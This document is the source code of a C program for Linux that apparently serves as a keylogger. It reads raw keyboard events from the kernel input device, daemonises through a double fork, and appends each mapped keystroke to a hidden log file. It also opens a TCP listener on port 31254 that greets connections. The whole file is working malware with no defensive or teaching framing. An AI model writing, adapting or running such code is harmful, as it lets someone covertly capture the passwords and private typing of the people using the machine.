#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <poll.h>
#include <fcntl.h>
#include <linux/input.h>


struct addrinfo *addr; int sockfd;
FILE *fkey; int fdev, isko = 1;

void sigtermhandler()
{
        close( sockfd );

        if ( isko ) { fclose(fkey); close(fdev); }
}

int main()
{
    int pfd[2]; pid_t pid1, pid2;

    if ( pipe( pfd ) == -1 ) { printf( "Failed to pipe() : exit\n" ); exit( EXIT_FAILURE ); }

    fdev = open( "/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY );
    if ( fdev == -1 ) { printf( "Can't open kbd event file [ try sudo ]\n" ); fflush(stdout); isko = 0; }
    else  { fkey = fopen( "./backkey","a" );
            printf( "Kbd event file : Ok, output -> ./backkey\n" ); fflush(stdout);}

    for ( int i = 0; i < _NSIG; i++ ) signal( i, SIG_DFL );

    pid1 = fork();

    if ( !pid1 ) {

        close( pfd[0] );

        if ( setsid() == -1 ) { printf( "Failed to setsid() : exit\n" ); fflush( stdout ); exit( EXIT_FAILURE ); }

        pid2 = fork();

        if ( !pid2 ) {

            pid_t chpid = getpid(); char wmsg = 1;

            printf( "PID = %i : Ok\n", chpid );

            if ( signal( SIGTERM, sigtermhandler ) == SIG_ERR ) printf( "Failed to signal() : well, Ok anyway...\n" );

            fflush( stdout );

            struct addrinfo hints, *addr, *p; int sockfd, connfd;
            unsigned char *hp = (unsigned char*)&hints;

            for ( size_t n = 0; n < sizeof hints; n++ ) hp[n] = 0;

            hints.ai_family = AF_UNSPEC;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_flags = AI_PASSIVE;

            if ( getaddrinfo( NULL, "31254", &hints, &addr ) != 0 ) wmsg = 2;

            else {

              for ( p = addr; p != NULL; p = p->ai_next ) {

                  sockfd = socket( p->ai_family, p->ai_socktype, p->ai_protocol );
                  if ( sockfd == -1 ) { printf( "socket() ??? : continue\n" ); continue; };

                  int flags = 1;

                  if ( setsockopt( sockfd, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(int) ) == -1 )
                  { printf( "Failed to setsockopt() ... \n" ); wmsg = 2; break; }

                  if ( bind( sockfd, p->ai_addr, p->ai_addrlen ) == -1 )
                  { printf( "bind() ??? : continue\n"); continue; }

                  break; } freeaddrinfo( addr );

                  if ( p == NULL ) { printf( "Failed to bind() ...\n" ); wmsg = 2; } else

                  if ( listen( sockfd, 1 ) == -1 ) { printf( "Failed to listen() ...\n" ); wmsg = 2; }
            }

            char cc[2]; cc[1] = 0;

            write( pfd[1], &wmsg, 1 );

            close( pfd[1] );

            while ( wmsg == 1 ) { int pres = 0; ssize_t kr; struct pollfd fds; struct input_event ev;

                    fds.events = POLL_IN; fds.fd = sockfd;

                while ( !pres ) { if ( isko ) {

                        kr = read( fdev, &ev, sizeof ev );
                                if ( kr == sizeof ev && ev.type == EV_KEY && ev.value == 1 )
                                { cc[0] = ev.code; int iskey = 1;
                                switch ( cc[0] ) {
                                case KEY_1 :		cc[0] = '1'; break;
                                case KEY_2 :		cc[0] = '2'; break;
                                case KEY_3 :		cc[0] = '3'; break;
                                case KEY_4 :		cc[0] = '4'; break;
                                case KEY_5 :		cc[0] = '5'; break;
                                case KEY_6 :		cc[0] = '6'; break;
                                case KEY_7 :		cc[0] = '7'; break;
                                case KEY_8 :		cc[0] = '8'; break;
                                case KEY_9 :		cc[0] = '9'; break;
                                case KEY_0 :		cc[0] = '0'; break;
                                case KEY_MINUS :	cc[0] = '-'; break;
                                case KEY_EQUAL :	cc[0] = '='; break;
                                case KEY_BACKSPACE:	cc[0] = '~'; break;
                                case KEY_TAB :		cc[0] = ' '; break;
                                case KEY_Q :		cc[0] = 'q'; break;
                                case KEY_W :		cc[0] = 'w'; break;
                                case KEY_E :		cc[0] = 'e'; break;
                                case KEY_R :		cc[0] = 'r'; break;
                                case KEY_T :		cc[0] = 't'; break;
                                case KEY_Y :		cc[0] = 'y'; break;
                                case KEY_U :		cc[0] = 'u'; break;
                                case KEY_I :		cc[0] = 'i'; break;
                                case KEY_O :		cc[0] = 'o'; break;
                                case KEY_P :		cc[0] = 'p'; break;
                                case KEY_LEFTBRACE:     cc[0] = '('; break;
                                case KEY_RIGHTBRACE:    cc[0] = ')'; break;
                                case KEY_SPACE :	cc[0] = ' '; break;
                                case KEY_ENTER :	cc[0] = '*'; break;
                                case KEY_A :		cc[0] = 'a'; break;
                                case KEY_S :		cc[0] = 's'; break;
                                case KEY_D :		cc[0] = 'd'; break;
                                case KEY_F :		cc[0] = 'f'; break;
                                case KEY_G :		cc[0] = 'g'; break;
                                case KEY_H :		cc[0] = 'h'; break;
                                case KEY_J :		cc[0] = 'j'; break;
                                case KEY_K :		cc[0] = 'k'; break;
                                case KEY_L :		cc[0] = 'l'; break;
                                case KEY_SEMICOLON:     cc[0] = ':'; break;
                                case KEY_APOSTROPHE:    cc[0] = '`'; break;
                                case KEY_GRAVE :	cc[0] = '`'; break;
                                case KEY_BACKSLASH:	cc[0] = '|'; break;
                                case KEY_Z :		cc[0] = 'z'; break;
                                case KEY_X :		cc[0] = 'x'; break;
                                case KEY_C :		cc[0] = 'c'; break;
                                case KEY_V :		cc[0] = 'v'; break;
                                case KEY_B :		cc[0] = 'b'; break;
                                case KEY_N :		cc[0] = 'n'; break;
                                case KEY_M :		cc[0] = 'm'; break;
                                case KEY_COMMA :	cc[0] = ','; break;
                                case KEY_DOT :		cc[0] = '.'; break;
                                case KEY_SLASH :	cc[0] = '/'; break;
                                default : 		iskey = 0; break;

                                } if ( iskey ) fputs( cc, fkey ); } }

                    pres = poll( &fds, 1, 100 );

                    if ( pres == -1 ) { perror( "poll()" ); exit( EXIT_FAILURE ); } }


                struct sockaddr_storage their_addr; socklen_t addr_size = sizeof their_addr;

                connfd = accept( sockfd, (struct sockaddr *)&their_addr, &addr_size );

                send( connfd, "Hello\n", 6, 0 );

                close( connfd );

            }

        }

        else if ( pid2 > 0 ) { close( pfd[1] ); exit( EXIT_SUCCESS ); }

        else if ( pid2 == -1 ) { close( pfd[1] );

            printf( "Failed to fork() #2 : exit\n" ); fflush( stdout ); exit( EXIT_FAILURE ); }

    }

    else if ( pid1 > 0 ) { close( pfd[1] ); char rmsg = 0;

        while ( !rmsg ) { read( pfd[0], &rmsg, 1 ); }

        close( pfd[0] );

        if ( rmsg == 1 ) printf( "Socket : Ok\nDone\n" );
        if ( rmsg == 2 ) printf( "Socket init error : exit\n" );

        fflush( stdout );
    }

    else if ( pid1 == -1 ) { close( pfd[1] ); close( pfd[0] );

        printf( "Failed to fork() #1 : exit\n" ); fflush( stdout ); exit( EXIT_FAILURE ); }

    exit( EXIT_SUCCESS );
}
